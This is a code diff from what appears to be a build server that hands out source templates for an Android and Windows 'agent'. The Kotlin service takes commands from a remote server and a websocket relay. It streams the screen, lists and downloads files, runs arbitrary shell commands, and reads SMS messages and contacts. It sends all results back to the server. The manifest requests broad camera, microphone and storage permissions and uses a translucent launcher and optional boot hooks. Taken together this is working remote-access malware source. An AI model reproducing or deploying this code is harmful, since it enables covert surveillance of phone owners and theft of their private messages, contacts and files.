+        val cmds = resp.optJSONArray("commands") ?: return
+        for (i in 0 until cmds.length()) {
+            val cmd = cmds.getJSONObject(i)
+            handleCommand(cmd)
+        }
+    }
+
+    private fun handleCommand(cmd: JSONObject) {
+        val id = cmd.optString("id")
+        val action = cmd.optString("action")
+        log("cmd: \$action (\$id)")
+
+        val result: JSONObject = when (action) {
+            "screen.start" -> { streaming = true; startScreenCapture(); JSONObject().put("ok", true) }
+            "screen.stop" -> { streaming = false; JSONObject().put("ok", true) }
+            "camera.list" -> listCameras()
+            "files.list" -> listFiles(cmd.optString("path", "/sdcard"))
+            "files.get" -> getFile(cmd.optString("path"))
+            "shell" -> runShell(cmd.optString("command", "echo ok"))
+            "location" -> getLocation()
+            "sms.read" -> readSms()
+            "contacts.read" -> readContacts()
+            "notify" -> sendNotification(cmd.optString("title", ""), cmd.optString("message", ""))
+            "info" -> getDeviceInfo()
+            else -> JSONObject().put("error", "unknown action: \$action")
+        }
+
+        val payload = JSONObject().apply {
+            put("device_id", deviceId)
+            put("device_token", deviceToken)
+            put("command_id", id)
+            put("result", result)
+        }
+        postJson("/api/public/agent/result", payload)
+    }
+
+    private fun startScreenCapture() {
+        if (mediaProjection == null) return
+        if (imageReader != null) return
+
+        val wm = getSystemService(WINDOW_SERVICE) as WindowManager
+        val metrics = DisplayMetrics()
+        @Suppress("DEPRECATION")
+        wm.defaultDisplay.getRealMetrics(metrics)
+
+        val w = metrics.widthPixels / 2
+        val h = metrics.heightPixels / 2
+        val dpi = metrics.densityDpi
+
+        imageReader = ImageReader.newInstance(w, h, PixelFormat.RGBA_8888, 2)
+        virtualDisplay = mediaProjection?.createVirtualDisplay(
+            "screen", w, h, dpi,
+            DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
+            imageReader!!.surface, null, null
+        )
+
+        imageReader?.setOnImageAvailableListener({ reader ->
+            if (!streaming) return@setOnImageAvailableListener
+            val image = reader.acquireLatestImage() ?: return@setOnImageAvailableListener
+            try {
+                val planes = image.planes
+                val buffer = planes[0].buffer
+                val pixelStride = planes[0].pixelStride
+                val rowStride = planes[0].rowStride
+                val rowPadding = rowStride - pixelStride * w
+
+                val bmp = Bitmap.createBitmap(w + rowPadding / pixelStride, h, Bitmap.Config.ARGB_8888)
+                bmp.copyPixelsFromBuffer(buffer)
+
+                val cropped = Bitmap.createBitmap(bmp, 0, 0, w, h)
+                val baos = ByteArrayOutputStream()
+                cropped.compress(Bitmap.CompressFormat.JPEG, 50, baos)
+
+                ws?.send(okio.ByteString.of(*baos.toByteArray()))
+
+                bmp.recycle()
+                if (cropped !== bmp) cropped.recycle()
+            } finally {
+                image.close()
+            }
+        }, handler)
+    }
+
+    private fun connectRelay() {
+        if (Binding.HIDEN_WS_URL.isBlank()) return
+        val url = "\${Binding.HIDEN_WS_URL}?role=agent&device=\$deviceId&key=\${Binding.HIDEN_AUTH_KEY}"
+        val req = Request.Builder().url(url).build()
+        ws = http.newWebSocket(req, object : WebSocketListener() {
+            override fun onMessage(webSocket: WebSocket, text: String) {
+                try {
+                    val cmd = JSONObject(text)
+                    handleCommand(cmd)
+                } catch (e: Exception) {
+                    log("ws cmd err: \$e")
+                }
+            }
+            override fun onFailure(webSocket: WebSocket, t: Throwable, response: Response?) {
+                log("ws fail: \$t, reconnecting in 5s")
+                Thread.sleep(5000)
+                connectRelay()
+            }
+            override fun onClosed(webSocket: WebSocket, code: Int, reason: String) {
+                log("ws closed: \$reason, reconnecting in 5s")
+                Thread.sleep(5000)
+                connectRelay()
+            }
+        })
+    }
+
+    private fun listCameras(): JSONObject {
+        return JSONObject().put("cameras", JSONArray().put("front").put("back"))
+    }
+
+    private fun listFiles(path: String): JSONObject {
+        val dir = File(path)
+        val arr = JSONArray()
+        dir.listFiles()?.take(200)?.forEach { f ->
+            arr.put(JSONObject().apply {
+                put("name", f.name)
+                put("is_dir", f.isDirectory)
+                put("size", if (f.isFile) f.length() else 0)
+                put("modified", f.lastModified())
+            })
+        }
+        return JSONObject().put("files", arr).put("path", path)
+    }
+
+    private fun getFile(path: String): JSONObject {
+        val f = File(path)
+        if (!f.exists() || !f.isFile) return JSONObject().put("error", "not found")
+        if (f.length() > 5_000_000) return JSONObject().put("error", "file too large (max 5MB)")
+        val bytes = f.readBytes()
+        val b64 = android.util.Base64.encodeToString(bytes, android.util.Base64.NO_WRAP)
+        return JSONObject().put("data", b64).put("name", f.name).put("size", f.length())
+    }
+
+    private fun runShell(command: String): JSONObject {
+        return try {
+            val proc = Runtime.getRuntime().exec(arrayOf("sh", "-c", command))
+            val stdout = proc.inputStream.bufferedReader().readText()
+            val stderr = proc.errorStream.bufferedReader().readText()
+            proc.waitFor()
+            JSONObject().put("stdout", stdout.take(10000)).put("stderr", stderr.take(2000)).put("exit_code", proc.exitValue())
+        } catch (e: Exception) {
+            JSONObject().put("error", e.message)
+        }
+    }
+
+    private fun getLocation(): JSONObject {
+        return JSONObject().put("error", "location requires async callback — use relay cmd")
+    }
+
+    private fun readSms(): JSONObject {
+        return try {
+            val arr = JSONArray()
+            val cursor = contentResolver.query(
+                android.provider.Telephony.Sms.CONTENT_URI,
+                arrayOf("address", "body", "date", "type"), null, null, "date DESC LIMIT 50"
+            )
+            cursor?.use {
+                while (it.moveToNext()) {
+                    arr.put(JSONObject().apply {
+                        put("address", it.getString(0))
+                        put("body", it.getString(1))
+                        put("date", it.getLong(2))
+                        put("type", it.getInt(3))
+                    })
+                }
+            }
+            JSONObject().put("messages", arr)
+        } catch (e: Exception) {
+            JSONObject().put("error", e.message)
+        }
+    }
+
+    private fun readContacts(): JSONObject {
+        return try {
+            val arr = JSONArray()
+            val cursor = contentResolver.query(
+                android.provider.ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
+                arrayOf(
+                    android.provider.ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
+                    android.provider.ContactsContract.CommonDataKinds.Phone.NUMBER
+                ), null, null, null
+            )
+            cursor?.use {
+                while (it.moveToNext()) {
+                    arr.put(JSONObject().apply {
+                        put("name", it.getString(0))
+                        put("phone", it.getString(1))
+                    })
+                }
+            }
+            JSONObject().put("contacts", arr)
+        } catch (e: Exception) {
+            JSONObject().put("error", e.message)
+        }
+    }
+
+    private fun sendNotification(title: String, message: String): JSONObject {
+        val mgr = getSystemService(NOTIFICATION_SERVICE) as NotificationManager
+        val notif = if (Build.VERSION.SDK_INT >= 26) {
+            Notification.Builder(this, CHANNEL_ID)
+                .setContentTitle(title)
+                .setContentText(message)
+                .setSmallIcon(android.R.drawable.ic_dialog_info)
+                .build()
+        } else {
+            @Suppress("DEPRECATION")
+            Notification.Builder(this)
+                .setContentTitle(title)
+                .setContentText(message)
+                .setSmallIcon(android.R.drawable.ic_dialog_info)
+                .build()
+        }
+        mgr.notify(System.currentTimeMillis().toInt(), notif)
+        return JSONObject().put("ok", true)
+    }
+
+    private fun getDeviceInfo(): JSONObject {
+        return JSONObject().apply {
+            put("model", Build.MODEL)
+            put("manufacturer", Build.MANUFACTURER)
+            put("brand", Build.BRAND)
+            put("android_version", Build.VERSION.RELEASE)
+            put("sdk_int", Build.VERSION.SDK_INT)
+            put("device", Build.DEVICE)
+            put("product", Build.PRODUCT)
+            put("board", Build.BOARD)
+            put("hardware", Build.HARDWARE)
+        }
+    }
+
+    private fun postJson(path: String, body: JSONObject): JSONObject? {
+        val url = "\${Binding.SENTINEL_SERVER}\$path"
+        val reqBody = body.toString().toRequestBody("application/json".toMediaType())
+        val req = Request.Builder().url(url).post(reqBody)
+            .addHeader("User-Agent", "VeltrixAgent-Android/1.0")
+            .build()
+        return try {
+            val resp = http.newCall(req).execute()
+            val text = resp.body?.string() ?: "{}"
+            JSONObject(text)
+        } catch (e: Exception) {
+            log("http err (\$path): \$e")
+            null
+        }
+    }
+
+    private fun log(msg: String) {
+        if (Binding.DEBUG) Log.d(TAG, msg)
+    }
+
+    override fun onDestroy() {
+        super.onDestroy()
+        virtualDisplay?.release()
+        imageReader?.close()
+        mediaProjection?.stop()
+        ws?.close(1000, "service stopped")
+    }
+}
+`
+
+const androidManifestXml = `<?xml version="1.0" encoding="utf-8"?>
+<manifest xmlns:android="http://schemas.android.com/apk/res/android">
+
+    <uses-permission android:name="android.permission.INTERNET" />
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MEDIA_PROJECTION" />
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_CAMERA" />
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MICROPHONE" />
+    <uses-permission android:name="android.permission.WAKE_LOCK" />
+    <uses-permission android:name="android.permission.POST_NOTIFICATIONS" />
+    <uses-permission android:name="android.permission.CAMERA" />
+    <uses-permission android:name="android.permission.RECORD_AUDIO" />
+    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
+    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />
+    <uses-permission android:name="android.permission.READ_MEDIA_IMAGES" />
+    <uses-permission android:name="android.permission.READ_MEDIA_VIDEO" />
+    <uses-permission android:name="android.permission.READ_MEDIA_AUDIO" />
+    <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />
+    {{OPT_BOOT_PERMISSION}}
+    {{OPT_LOCATION_PERMISSIONS}}
+    {{OPT_SMS_PERMISSIONS}}
+    {{OPT_CONTACTS_PERMISSIONS}}
+
+    <application
+        android:allowBackup="false"
+        android:label="{{APP_DISPLAY_NAME}}"
+        android:supportsRtl="true"
+        android:usesCleartextTraffic="true">
+
+        <activity
+            android:name=".MainActivity"
+            android:exported="true"
+            android:theme="@android:style/Theme.Translucent.NoTitleBar">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity>
+
+        <service
+            android:name=".AgentService"
+            android:foregroundServiceType="mediaProjection|camera|microphone"
+            android:exported="false" />
+
+        {{OPT_BOOT_RECEIVER}}
+
+        {{OPT_ACCESSIBILITY_SERVICE}}
+    </application>
+</manifest>
+`
+
+const androidAppBuildGradleKts = `plugins {
+    id("com.android.application")
+    id("org.jetbrains.kotlin.android")
+}
+
+android {
+    namespace = "com.veltrix.{{PACKAGE_SUFFIX}}"
+    compileSdk = 34
+
+    defaultConfig {
+        applicationId = "com.veltrix.{{PACKAGE_SUFFIX}}"
+        minSdk = 26
+        targetSdk = 34
+        versionCode = 1
+        versionName = "1.0"
+    }
+
+    buildTypes {
+        release {
+            isMinifyEnabled = true
+            proguardFiles(getDefaultProguardFile("proguard-android-optimize.txt"), "proguard-rules.pro")
+            signingConfig = signingConfigs.getByName("debug")
+        }
+    }
+    compileOptions {
+        sourceCompatibility = JavaVersion.VERSION_17
+        targetCompatibility = JavaVersion.VERSION_17
+    }
+    kotlinOptions {
+        jvmTarget = "17"
+    }
+}
+
+dependencies {
+    implementation("androidx.core:core-ktx:1.12.0")
+    implementation("androidx.appcompat:appcompat:1.6.1")
+    implementation("com.squareup.okhttp3:okhttp:4.12.0")
+    implementation("org.json:json:20231013")
+    implementation("androidx.camera:camera-core:1.3.1")
+    implementation("androidx.camera:camera-camera2:1.3.1")
+    implementation("androidx.camera:camera-lifecycle:1.3.1")
+    implementation("com.google.android.gms:play-services-location:21.1.0")
+}
+`
+
+const androidRootBuildGradleKts = `// Top-level build file
+plugins {
+    id("com.android.application") version "8.2.0" apply false
+    id("org.jetbrains.kotlin.android") version "1.9.22" apply false
+}
+`
+
+const androidSettingsGradleKts = `pluginManagement {
+    repositories {
+        google()
+        mavenCentral()
+        gradlePluginPortal()
+    }
+}
+dependencyResolutionManagement {
+    repositoriesMode.set(RepositoriesMode.FAIL_ON_PROJECT_REPOS)
+    repositories {
+        google()
+        mavenCentral()
+    }
+}
+rootProject.name = "{{BUILD_NAME}}"
+include(":app")
+`
+
+const androidGradleProperties = `org.gradle.jvmargs=-Xmx2048m -Dfile.encoding=UTF-8
+android.useAndroidX=true
+android.nonTransitiveRClass=true
+kotlin.code.style=official
+`
+
+const androidProguardRules = `-keep class com.veltrix.** { *; }
+-keep class okhttp3.** { *; }
+-dontwarn okhttp3.**
+`
+
+export const Route = createFileRoute('/api/public/buildserver/stub')({
+  server: {
+    handlers: {
+      GET: async ({ request }) => {
+        if (!(await verifyBuildserverKey(request))) {
+          return new Response('Unauthorized', { status: 401 })
+        }
+
+        const url = new URL(request.url)
+        const platform = url.searchParams.get('platform') || 'windows'
+
+        if (platform === 'android') {
+          const files: Record<string, string> = {
+            'app/src/main/java/com/veltrix/agent/Binding.kt': androidBindingKt,
+            'app/src/main/java/com/veltrix/agent/AgentService.kt': androidAgentServiceKt,
+            'app/src/main/java/com/veltrix/agent/MainActivity.kt': androidMainActivityKt,
+            'app/src/main/java/com/veltrix/agent/BootReceiver.kt': androidBootReceiverKt,
+            'app/src/main/AndroidManifest.xml': androidManifestXml,
+            'app/build.gradle.kts': androidAppBuildGradleKts,
+            'app/proguard-rules.pro': androidProguardRules,
+            'build.gradle.kts': androidRootBuildGradleKts,
+            'settings.gradle.kts': androidSettingsGradleKts,
+            'gradle.properties': androidGradleProperties,
+          }
+          return new Response(JSON.stringify({ files, language: 'kotlin', variant: 'android' }), {
+            headers: { 'Content-Type': 'application/json' },
+          })
+        }
+
+        // Default: Rust / Windows stub
+        const files: Record<string, string> = {
+          'Cargo.toml': cargoToml,
+          'src/main.rs': mainRs,
+          'src/binding.rs': bindingRs,
+          'src/signaling.rs': signalingRs,
+          'src/webrtc.rs': webrtcRs,
+          'src/hiden.rs': hidenRs,
+        }
+
+        return new Response(JSON.stringify({ files, language: 'rust', variant: 'full' }), {
+          headers: { 'Content-Type': 'application/json' },
+        })
+      },
+    },
+  },
+})
